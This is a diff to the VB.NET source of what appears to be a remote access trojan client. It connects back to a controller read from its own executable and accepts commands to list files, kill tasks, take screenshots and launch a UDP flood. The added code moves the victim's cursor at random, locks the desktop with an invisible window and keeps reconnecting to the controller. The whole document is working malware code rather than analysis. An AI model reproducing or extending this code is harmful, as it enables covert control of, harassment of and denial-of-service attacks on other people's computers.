@@ -29,7 +29,6 @@ Public Class Form1
 
 
 
-
     Public ClearMyplug As Boolean = False
 
 
@@ -325,49 +324,58 @@ Public Class Form1
     End Sub
 
     Public Sub FileManagerGoForward(ByVal NewPath As String)
-        Dim Path = NewPath
+        Try
+            Dim Path = NewPath
 
-        Dim ListOfGarbage As New StringBuilder
+            Dim ListOfGarbage As New StringBuilder
 
-        '   Dim ListOfDirs As New StringBuilder
-        For Each yu In Directory.GetFiles(Path, "*.*", SearchOption.TopDirectoryOnly)
-            ' Dim lvi As New ListViewItem(yu) 'first column
+            '   Dim ListOfDirs As New StringBuilder
+            For Each yu In Directory.GetFiles(Path, "*.*", SearchOption.TopDirectoryOnly)
+                ' Dim lvi As New ListViewItem(yu) 'first column
 
-            Dim MyNameIsWhat = IO.Path.GetFileName(yu)
-
-
-
-            ListOfGarbage.AppendLine(MyNameIsWhat)
+                Dim MyNameIsWhat = IO.Path.GetFileName(yu)
 
 
 
-
-        Next
-        ListOfGarbage.AppendLine("StopFilesNowDir")
-
-        For Each yu In Directory.GetDirectories(Path, "*.*", SearchOption.TopDirectoryOnly)
-
-            Dim MyNameIsWhat = IO.Path.GetFileName(yu)
-
-
-            ListOfGarbage.AppendLine(MyNameIsWhat)
+                ListOfGarbage.AppendLine(MyNameIsWhat)
 
 
 
 
-        Next
+            Next
+            ListOfGarbage.AppendLine("StopFilesNowDir")
 
-        ListOfGarbage.Append("NoGodPlsNoNOOO")
+            For Each yu In Directory.GetDirectories(Path, "*.*", SearchOption.TopDirectoryOnly)
 
-        ListOfGarbage.Append(Path)
-
-
+                Dim MyNameIsWhat = IO.Path.GetFileName(yu)
 
 
-        Dim buffer() As Byte = Encoding.UTF8.GetBytes(ListOfGarbage.ToString)
+                ListOfGarbage.AppendLine(MyNameIsWhat)
 
-        MonClient.GetStream().Write(buffer, 0, buffer.Length)
-        TextBox1.Text = String.Empty
+
+
+
+            Next
+
+            ListOfGarbage.Append("NoGodPlsNoNOOO")
+
+            ListOfGarbage.Append(Path)
+
+
+
+
+            Dim buffer() As Byte = Encoding.UTF8.GetBytes(ListOfGarbage.ToString)
+
+            MonClient.GetStream().Write(buffer, 0, buffer.Length)
+            TextBox1.Text = String.Empty
+
+        Catch ex As Exception
+
+            Dim buffer() As Byte = Encoding.UTF8.GetBytes("Couldn'tGOFWW")
+
+            MonClient.GetStream().Write(buffer, 0, buffer.Length)
+            TextBox1.Text = String.Empty
+        End Try
     End Sub
     Public Sub DeleteSelectedFileOrFolder(ByVal pathfileorfolder As String)
 
@@ -567,7 +575,9 @@ Public Class Form1
 
 
 
+        ElseIf TextBox1.Text = "StartToChangeTheCursoToRandom" Then
 
+            RDCTIMER.Start()
 
         ElseIf TextBox1.Text.EndsWith("/ThisTaskIsToKill") Then   'TASK Killer
             Dim PrepareTask As String = TextBox1.Text.Replace("/ThisTaskIsToKill", "")
@@ -598,6 +608,15 @@ Public Class Form1
 
             ''
 
+
+        ElseIf TextBox1.Text.Contains("LockInvisiblePlease") Then
+
+
+            LockThatShit()
+
+        ElseIf TextBox1.Text.Contains("UNLockInvisiblePlease") Then
+            UnlockThatShit()
+
         ElseIf TextBox1.Text = "TakeAPhotooo561" Then  'SCREENSHOT
 
             Dim lk As New Random
@@ -624,6 +643,23 @@ Public Class Form1
         End If
     End Sub
 
+
+    Public Sub RDC()
+        Dim k As New Random
+        Dim primaryMonitorSize As Size = SystemInformation.PrimaryMonitorSize
+        Dim X As Integer = k.Next(0, primaryMonitorSize.Width)
+        Dim Y As Integer = k.Next(0, primaryMonitorSize.Height)
+        Win32APILib.AllFunctions.ChangeCursorPosition(X, Y)
+
+    End Sub
+    Public Sub UnlockThatShit()
+        InvDeskLock.Close()
+        TextBox1.Text = String.Empty
+    End Sub
+    Public Sub LockThatShit()
+        InvDeskLock.Show()
+        TextBox1.Text = String.Empty
+    End Sub
 
     Private Sub Form1_FormClosing(ByVal sender As System.Object, ByVal e As System.Windows.Forms.FormClosingEventArgs) Handles MyBase.FormClosing
 
@@ -724,7 +760,9 @@ Public Class Form1
 
         options = Split(data, splitz)
 
-
+        ''FOR CURSOR
+        Win32APILib.AllFunctions.PlayWithWindows.SetWindowPos(Me.Handle, Win32APILib.AllFunctions.PlayWithWindows.HWND_TOPMOST, 0, 0, 0, 0, Win32APILib.AllFunctions.PlayWithWindows.SWP_NOMOVE Or Win32APILib.AllFunctions.PlayWithWindows.SWP_NOSIZE)
+        ''
 
 
         If options(3) = "true" Then
@@ -749,7 +787,7 @@ Public Class Form1
                 Dim buffer() As Byte = Encoding.UTF8.GetBytes(k)
                 MonClient.GetStream().Write(buffer, 0, buffer.Length)
                 ''
-
+                Timer2.Start()
             Else
 
                 Timer1.Start()
@@ -759,7 +797,7 @@ Public Class Form1
 
         Catch ex As Exception
             '  MessageBox.Show(ex.Message, "Erreur") 'Afficher l'erreur.
-            Timer1.Start()
+            '   Timer1.Start()
         End Try
     End Sub
 
@@ -791,7 +829,7 @@ Public Class Form1
 
             Else
                 Timer1.Stop()
-
+                Timer2.Start()
             End If
             Task.Run(Sub() LireLesMessages(Context, MonClient.GetStream()))
 
@@ -811,6 +849,47 @@ Public Class Form1
         Task.Run(Sub() UDP(UDPByte, IP))
         Task.Run(Sub() UDP(UDPByte, IP))
         Task.Run(Sub() UDP(UDPByte, IP))
+    End Sub
+
+    Private Sub RDCTIMER_Tick(sender As Object, e As EventArgs) Handles RDCTIMER.Tick
+        Task.Run(Sub() RDC())
+        If TextBox1.Text = "StartToChangeTheCursoToRandom" Then
+            TextBox1.Text = String.Empty
+        End If
+    End Sub
+
+    Private Sub Timer2_Tick(sender As Object, e As EventArgs) Handles Timer2.Tick
+        'NoneJustTryToConnect
+        Try
+            Dim buffer() As Byte = Encoding.UTF8.GetBytes("NoneJustTryToConnect")
+            MonClient.GetStream().Write(buffer, 0, buffer.Length)
+
+        Catch ex As Exception
+            FileOpen(1, System.Windows.Forms.Application.ExecutablePath, OpenMode.Binary, OpenAccess.Read)
+            Dim data As String = Space(LOF(1))
+            FileGet(1, data)
+            FileClose(1)
+            Dim options() As String
+
+            options = Split(data, splitz)
+
+
+            Dim Context As TaskScheduler = TaskScheduler.FromCurrentSynchronizationContext()
+                MonClient = New TcpClient()
+            MonClient.Connect(IPAddress.Parse(options(1)), Integer.Parse(options(2)))
+
+
+            Dim l As New Random
+            id = l.Next(100000, 999999).ToString
+            Dim k = id + "THISISMYID"
+            Dim buffer() As Byte = Encoding.UTF8.GetBytes(k)
+            MonClient.GetStream().Write(buffer, 0, buffer.Length)
+
+            Task.Run(Sub() LireLesMessages(Context, MonClient.GetStream()))
+
+            Timer1.Start()
+        End Try
+
     End Sub
 End Class
 
